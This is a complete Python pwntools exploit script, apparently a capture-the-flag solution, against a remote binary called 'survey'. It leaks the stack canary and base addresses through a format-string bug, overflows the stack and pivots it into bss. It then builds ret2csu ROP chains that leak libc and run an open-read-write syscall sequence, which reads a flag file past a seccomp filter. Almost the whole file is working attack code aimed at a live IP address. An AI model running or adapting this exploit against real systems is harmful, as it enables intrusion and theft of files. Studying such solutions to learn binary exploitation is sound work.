#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import time
from pwn import *
context.log_level = 'debug'

elf = ELF('./survey')

# ROP Gadgets
pop_rbp_ret     = 0x1174          # pop rbp ; ret
pop_rsi_r15_ret = 0x1351          # pop rsi ; pop r15 ; ret
pop_rdi_ret     = 0x1353          # pop rdi ; ret
pop_rsp_r13_r14_r15_ret = 0x134d  # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
ret             = 0x101a          # ret

# Memory locations
hello_fmt = 0x2030

# Byte sequence alias
A8 = 8 * b'A'


def uROP(elf_base, fini_ptr, addr, arg1, arg2, arg3) -> bytes:
    """
    Returns an ROP chain to call a function
    :param elf_base: the base address of ELF image
    :param fini_ptr: *fini_ptr must contain &_fini()
    :param addr: the address of the function
    :param arg1: edi
    :param arg2: rsi
    :param arg3: rdx
    :return: a sequence of bytes
    """
    __libc_csu_init1 = elf_base + 0x1330
    __libc_csu_init2 = elf_base + 0x1346

    payload  = p64(__libc_csu_init2)    # ret2csu
    payload += A8                       # padding
    payload += p64(0)                   # rbx
    payload += p64(1)                   # rbp
    payload += p64(arg1)                # r12 -> edi
    payload += p64(arg2)                # r13 -> rsi
    payload += p64(arg3)                # r14 -> rdx
    payload += p64(fini_ptr)            # r15
    payload += p64(__libc_csu_init1)    # ret -> call [r12 + rbx*8] ... -> r12 + rbx * 8 -> _fini
    payload += A8 * 7                   # padding
    payload += p64(addr)                # ret
    return payload


def main():
    '''
    1. Leak stack canary via fmt attack
    2. Return to main()'s 2nd read() again
       - main()'s 2nd read: 0x5558b3315292
       - main()'s ret_addr: 0x7f83471c1152

    rbp 可控
    0x0000000000001198 : call qword ptr [rbp + 0x48]
    '''
    proc = remote('140.112.31.97', 30201)
    #proc = remote('127.0.0.1', 10101)
    #proc = elf.process()
    #log.debug('You may attatch this process to gdb now.')
    #raw_input()

    # Develop your exploit here
    proc.recvuntil('name : ')
    proc.send(b'A' * 25)

    # Leak stack canary (8 bytes) via fmt
    proc.recvuntil('Hello, ' + 'A' * 25)

    canary = u64(b'\x00' + proc.recv(7))
    log.info('leaked canary: {}'.format(hex(canary)))

    __libc_csu_init = u64(proc.recv(6).ljust(8, b'\x00'))
    elf_text = __libc_csu_init - (0x559b16c6b2f0 - 0x559b16c6b000)
    elf_base = elf_text - (0x5593bb105000 - 0x5593bb104000)
    elf_bss = elf_text + (0x561846a350f8 - 0x561846a32000)
    log.info('leaked __libc_csu_init: {}'.format(hex(__libc_csu_init)))
    log.info('leaked ELF text: {}'.format(hex(elf_text)))
    log.info('leaded ELF bss:  {}'.format(hex(elf_bss)))

    main_2nd_read = elf_text + (0x55576e52d292  - 0x55576e52d000)
    elf_main = main_2nd_read - (0x1292 - 0x1235)
    log.info('leaked main()\'s 2nd read(): {}'.format(hex(main_2nd_read)))
    log.info('leaded main(): {}'.format(hex(elf_main)))

    # Write to the same stack buf again and overflow it,
    # but this time with the leaked canary
    proc.recvuntil('here : ')
    payload  = A8 * 3                # padding
    payload += p64(canary)           # canary
    payload += p64(elf_bss + 0x808)  # saved rbp (go to this empty place to bypass canary later)
    payload += p64(elf_main)         # ret addr
    proc.send(payload)

    # Return to main() again.
    # Note: avoid returning to somewhere before prctl() due to seccomp.
    proc.recvuntil('name : ')
    payload  = A8 * 3
    payload += p64(canary)
    payload += p64(elf_bss + 0x808 + 8 + 0x20)
    payload += p64(elf_main)
    proc.send(payload)
    proc.recvuntil('here : ')
    proc.sendline()


    # Prepare for multiple read()
    __libc_csu_init1 = elf_base + 0x1330
    __libc_csu_init2 = elf_base + 0x1346
    bss_fini_ptr = elf_bss + 0x808 + 8 + 48

    # main() again...
    # This time we can write ROP chain (only 48 bytes)
    # read() will return to our ROP chain instead of main()
    proc.recvuntil('name : ')
    payload  = p64(elf_base + pop_rsi_r15_ret)    # ret
    payload += p64(elf_bss + 0x808 + 8 + 48)      # rsi -----------------
    payload += p64(0)                             # rbp (dummy)         |
    payload += p64(elf_base + elf.sym['read'])    # ret                 |
    payload += p64(elf_base + pop_rsi_r15_ret)    # ret                 |
    payload += p64(elf_bss + 0x808 + 8 + 48 * 2)  # rsi ----------------|-----
    proc.send(payload)                            #                     |    |
    # --------------------------------------------                      |    |
    payload  = p64(elf_base + 0x1368)             # rbp (dummy) <--------    |
    payload += p64(elf_base + elf.sym['read'])    # ret                      |
    payload += p64(elf_base + pop_rsi_r15_ret)    # ret                      |
    payload += p64(elf_bss + 0x808 + 8 + 48 * 3)  # rsi -----------------    |
    payload += p64(0)                             # rbp (dummy)         |    |
    payload += p64(elf_base + elf.sym['read'])    # ret                 |    |
    time.sleep(0.1)                               #                     |    |
    proc.send(payload)                            #                     |    |
    #---------------------------------------------                      |    |
    payload  = p64(elf_base + pop_rsi_r15_ret)    # ret    <------------------
    payload += p64(elf_bss + 0x808 + 8 + 48 * 4)  # rsi -------------   |
    payload += p64(0)                             # rbp (dummy)     |   |
    payload += p64(elf_base + elf.sym['read'])    # ret             |   |
    payload += p64(elf_base + pop_rsi_r15_ret)    # ret             |   |
    payload += p64(elf_bss + 0x808 + 8 + 48 * 5)  # rsi ---------------------------
    time.sleep(0.1)                               #                 |   |         |
    proc.send(payload)                            #                 |   |         |
    #---------------------------------------------                  |   |         |
    payload  = p64(0)                             # rbp (dummy)  <-------         |
    payload += p64(elf_base + elf.sym['read'])    # ret             |             |
    payload += p64(elf_base + pop_rsi_r15_ret)    # ret             |             |
    payload += p64(elf_bss + 0x808 + 8 + 48 * 6)  # rsi --------------------      |
    payload += p64(0)                             # rbp (dummy)     |      |      |
    payload += p64(elf_base + elf.sym['read'])    # ret             |      |      |
    time.sleep(0.1)                               #                 |      |      |
    proc.send(payload)                            #                 |      |      |
    #---------------------------------------------                  |      |      |
    payload  = p64(__libc_csu_init2)              # ret2csu  <-------      |      |
    payload += A8                                 # padding                |      |
    payload += p64(0)                             # rbx                    |      |
    payload += p64(1)                             # rbp                    |      |
    payload += p64(0)                             # r12 -> edi             |      |
    payload += p64(elf_bss + 0x808 + 48 * 7)      # r13 -> rsi -----       |      |
    time.sleep(0.1)                               #                |       |      |
    proc.send(payload)                            #                |       |      |
    # --------------------------------------------                 |       |      |
    payload  = p64(0x400)                         # r14 -> rdx  <------------------
    payload += p64(bss_fini_ptr)                  # r15            |       |
    payload += p64(__libc_csu_init1)              # ret            |       |
    payload += A8 * 3                             # padding        |       |
    time.sleep(0.1)                               #                |       |
    proc.send(payload)                            #                |       |
    # --------------------------------------------                 |       |
    payload  = A8 * 4                             # padding  <--------------
    payload += p64(elf_base + elf.sym['read'])    # ret            |
    payload += A8                                 # ret  <----------
    time.sleep(0.1)
    proc.send(payload)

    # At this point, we should be able to perform
    # arbitrary write via read(). ^____^
    # Here we will leak libc address, write final payload and pivot the stack.
    payload  = uROP(elf_base, bss_fini_ptr, elf_base + elf.sym['read'], 0, 0, 0)  # set rax = 0
    payload += uROP(elf_base, bss_fini_ptr, elf_base + pop_rdi_ret, 0, elf_base + elf.got['read'], 0)
    payload += p64(elf_base + hello_fmt)               # rdi
    payload += p64(elf_base + ret)                     # ret (stack alignment)
    payload += p64(elf_base + elf.sym['printf'])       # ret
    payload += p64(elf_base + pop_rbp_ret)             # ret
    payload += p64(elf_bss + 0x808 + 8 + 48 * 7 + 17 * 8 * 2 + 8 * 6) # rbp  ---
    payload += p64(elf_base + 0x12b9)                  # ret                   |
    payload += p64(canary)                             #                       |
    payload += A8                                      # padding  <-------------
    payload += uROP(elf_base, bss_fini_ptr, elf_base + elf.sym['read'], 0, elf_bss + 0x300, 0x400)
    payload += p64(elf_base + pop_rsp_r13_r14_r15_ret) # ret
    payload += p64(elf_bss + 0x300)                    # rsp
    time.sleep(0.1)
    proc.send(payload)

    proc.recvuntil('Hello, ')
    runtime_read = u64(proc.recv(6).ljust(8, b'\x00'))
    runtime_syscall = runtime_read + 15
    log.info('leaked read(): {}'.format(hex(runtime_read)))
    log.info('leaked syscall gadget: {}'.format(hex(runtime_syscall)))

    # Write flag path into memory and orw the flag
    flag_path_str = b'/home/survey/flag\x00'
    flag_path_ptr = elf_bss + 0x100
    buf = elf_bss + 0x200
    fd = 3
    payload  = A8 * 3                             # padding
    payload += uROP(elf_base, bss_fini_ptr, elf_base + elf.sym['read'], 0, flag_path_ptr, len(flag_path_str))
    payload += uROP(elf_base, bss_fini_ptr, elf_base + elf.sym['read'], 0, flag_path_ptr, 2)  # set rax = 2
    payload += uROP(elf_base, bss_fini_ptr, elf_base + pop_rdi_ret, 0, 0, 0)
    payload += p64(flag_path_ptr)    # rdi
    payload += p64(runtime_syscall)  # ret
    payload += uROP(elf_base, bss_fini_ptr, elf_base + elf.sym['read'], 0, 0, 0)  # set rax = 0
    payload += uROP(elf_base, bss_fini_ptr, runtime_syscall, fd, buf, 64)
    payload += uROP(elf_base, bss_fini_ptr, elf_base + elf.sym['read'], 0, flag_path_ptr, 1)  # set rax = 1
    payload += uROP(elf_base, bss_fini_ptr, runtime_syscall, 1, buf, 64)
    time.sleep(0.1)
    proc.send(payload)

    time.sleep(0.1)
    proc.send(flag_path_str)
    time.sleep(0.1)
    proc.send(b'/h')
    time.sleep(0.1)
    proc.send(b'/h')

    proc.interactive()


if __name__ == '__main__':
    main()
